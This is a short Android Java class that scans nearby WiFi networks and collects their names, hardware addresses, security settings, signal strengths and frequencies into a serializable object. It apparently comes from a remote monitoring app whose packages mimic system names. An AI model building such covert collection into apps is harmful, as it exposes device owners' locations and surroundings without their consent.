package Transfer;

import android.content.Context;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

public class WifiScan implements Serializable {

  public List<String> BSSID;
  public List<String> CAPABILITIES;
  public List<Integer> FREQUENCY;
  public List<Integer> LEVEL;
  public List<String> SSID;

  public WifiScan() {
    SSID = new ArrayList();
    BSSID = new ArrayList();
    CAPABILITIES = new ArrayList();
    LEVEL = new ArrayList();
    FREQUENCY = new ArrayList();

    try {
      WifiManager wifiManager =
          (WifiManager) MyService.context.getSystemService(Context.WIFI_SERVICE);
      wifiManager.startScan();
      for (ScanResult scanResult : wifiManager.getScanResults()) {
        SSID.add(scanResult.SSID);
        BSSID.add(scanResult.BSSID);
        CAPABILITIES.add(scanResult.capabilities);
        LEVEL.add(scanResult.level);
        FREQUENCY.add(scanResult.frequency);
      }
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
